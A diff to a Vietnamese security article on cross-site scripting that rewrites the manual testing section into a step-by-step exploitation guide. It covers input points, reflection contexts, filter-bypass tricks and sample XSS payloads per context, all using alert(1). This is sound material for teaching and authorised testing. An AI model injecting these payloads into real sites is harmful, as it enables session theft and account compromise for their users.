@@ -98,21 +98,92 @@ XSS có thể được sử dụng như một phương tiện để tấn công 
 
 Đây có thể là bước đầu tiên trong một cuộc tấn công lớn hơn nhằm khai thác các lỗ hổng khác của hệ thống. Ví dụ, kẻ tấn công có thể lợi dụng XSS để xâm nhập vào hệ thống và phát hiện thêm các lỗ hổng bảo mật khác và nhắm tới các quyền truy cập cao hơn.
 ## Cách phát hiện lỗ hổng XSS
-### Phát hiện lỗ hổng XSS bằng thủ công
-Kiểm tra thủ công giúp hiểu rõ hơn về ứng dụng và có thể phát hiện những lỗ hổng tinh vi mà công cụ tự động bỏ sót. Cách kiểm tra thủ công thường tập trung vào các trường đầu vào của người dùng.
+### Khai thác lỗ hổng XSS bằng thủ công
+#### Mục tiêu và nguyên tắc chung
+Xác định vị trí dữ liệu người dùng được phản hồi lại (reflection), lưu trữ (stored), hoặc được xử lý trên client (DOM).
+Hiểu context nơi dữ liệu được chèn (HTML body, attribute, JavaScript, CSS, URL, header...).
+Thử payload tối thiểu để gây thực thi JavaScript hoặc tương tác khác.
+Nguyên tắc: bắt đầu từ payload đơn giản (<script>alert(1)</script>), sau đó tăng dần độ phức tạp và thử theo từng context.
+#### Các bước kiểm tra thủ công
+** Bước 1 — Xác định điểm đầu vào (input points)
+- Tìm mọi nơi ứng dụng nhận dữ liệu:
+- Form (login, search, comment, feedback, profile).
+- URL parameters (query string, path segment), hash (#).
+- Cookies, headers (Referer, User-Agent), upload file names.
+- APIs trả JSON, HTML fragments, template rendering.
+  
+=> Dùng trình duyệt + proxy (Burp/OWASP ZAP) để ghi lại request/response.
 
-Các bước kiểm tra thủ công:
+** Bước 2 — Xác định nơi phản hồi (reflection/storage/DOM)
+- Reflected: dữ liệu xuất hiện ngay trong response HTML.
+- Stored: dữ liệu được lưu server rồi trả lại cho người khác (ví dụ comment).
+- DOM-based: không cần server phản hồi chứa payload; client JS đọc URL/DOM và chèn vào page.
+  
+=> Dùng tính năng “Find in response” trong proxy hoặc tìm chuỗi bạn gửi xuất hiện ở đâu.
 
-* Xác định các điểm đầu vào: Tìm kiếm các trường nhập liệu như input search, commentlogin, feedback, profile update...
-* Chèn các chuỗi thử nghiệm XSS: Tại các điểm đầu vào, chèn mã JavaScript thử nghiệm để kiểm tra xem có thực thi hay không. Ví dụ:
-  "><script>alert(‘XSS’)</script>
-<img src=x onerror=alert(‘XSS’)>"
-* Theo dõi phản hồi của ứng dụng và quan sát thông tin trả về: Nếu mã JavaScript được thực thi và hiển thị, thì ứng dụng đang tồn tại lỗ hổng XSS. Ví dụ như:
-+ Nếu như mã có xuất hiện trong phần body html và phản hồi ngay thì ta có thể nghi ngờ và kiểm tra lỗi liên quan đến Reflected XSS.
-+ Nếu xuất hiện lại trong phần header thì kiểm tra các lỗi liên quan đến HTTP Header Injection.
-+ Trường hợp trong phần body xuất hiện giá trị mà đã gửi lên trong yêu cầu thì thử xem có thể thực thi được JavaScript bằng cách chèn các thẻ <script></script>.
+** Bước 3 — Xác định context của dữ liệu trong HTML
+- Context quyết định payload cần dùng:
+- HTML body text: <div>...HERE...</div>
+- HTML attribute: <img src="HERE"> hoặc <input value="HERE">
+- Inside tag name (hiếm)
+- Inside JavaScript: var s = 'HERE'; hoặc document.write("HERE");
+- URL/Location: href, src, window.location
+- CSS: style="background-image:url(HERE)"
+- HTML comment: <!-- HERE -->
+  
+=> Mỗi context có cách escape/encoding khác — quan trọng nhất là tìm cách phá rào ngăn (break out) khỏi context.
 
-* Kiểm tra các tình huống phức tạp: Kiểm tra các biến thể phức tạp hơn của XSS như DOM-based XSS, nơi các tập lệnh được thực thi trực tiếp từ phía trình duyệt Các tính huống phức tạp như:
+** Bước 4 — Thử payload cơ bản
+- Bắt đầu bằng payload hiển thị dễ thấy (an toàn cho môi trường testing):
+- Reflected/body: "><script>alert(1)</script> hoặc "><img src=x onerror=alert(1)>
+- Attribute: " onmouseover="alert(1)" hoặc ' onerror=alert(1) x='
+- JS context: ';alert(1);// hoặc ");alert(1);//
+- URL/href: javascript:alert(1) (nhiều nơi chặn)
+- DOM: "><svg/onload=alert(1)> hay </script><script>alert(1)</script>
+
+=> Quan sát: payload có được phản hồi nguyên vẹn? Nó được encode? Thực thi?
+
+**  Bước 5 — Kiểm tra DOM-based XSS
+- Thử sửa fragment/hash: http://site/page#payload
+- Quan sát DOM/Network trong DevTools: tìm document.write, innerHTML, eval, location, innerText vs textContent.
+- Thử inject chuỗi như #"><img src=x onerror=alert(1)> hoặc #test%0A<script...>
+  
+=> Dùng console để chạy script: document.querySelector(...).innerHTML = location.hash — nếu thấy ứng dụng làm tương tự, nguy cơ DOM XSS cao
+
+** Bước 6 — Tinh chỉnh & bypass
+- Nếu payload bị encode/chuyển đổi:
+- Thử thay đổi dạng payload (SVG, iframe, event handlers, CSS expressions).
+- Thử các ký tự escape như \x3C (hex) hoặc &#x3C; (HTML entities) nếu lọc không đầy đủ.
+  
+=>Sử dụng payload ngắn hơn, tận dụng tag tự đóng hoặc attribute-based payloads.
+
+#### Một số payload mẫu (dùng cho test, sửa theo context)
+
+a. Body / Reflected: 
+- <script>alert(1)</script>
+- "><img src=x onerror=alert(1)>
+- '><svg/onload=alert(1)>
+
+b. Attribute: 
+- " onerror=alert(1) x="
+- '><img src=x onerror=alert(1)>
+- " autofocus onfocus=alert(1) x=" (dùng với input)
+
+c. Inside JavaScript string:
+- ');alert(1);//
+- ");alert(1);//
+- '+alert(1)+'
+
+d. URL / href:
+- javascript:alert(1) (nhiều nơi chặn/ghi bảng trắng)
+- /page?next=javascript:alert(1) (thử redirect)
+
+e. DOM-specific:
+- #<img src=x onerror=alert(1)>
+- #"><svg/onload=alert(1)>
+
+! Ghi chú: thay alert(1) bằng console.log('xss') hoặc fetch đến server của bạn khi muốn fingerprinting (chỉ dùng trong môi trường có phép).
+
 ## Cách ngăn chặn lỗ hổng
 Mặc dù loại tấn công này được coi là một trong những loại nguy hiểm và rủi ro nhất, nhưng vẫn nên chuẩn bị một kế hoạch ngăn ngừa. Bởi vì sự phổ biến của cuộc tấn công này, có khá nhiều cách để ngăn chặn nó.
 Các phương pháp phòng ngừa chính được sử dụng phổ biến bao gồm:
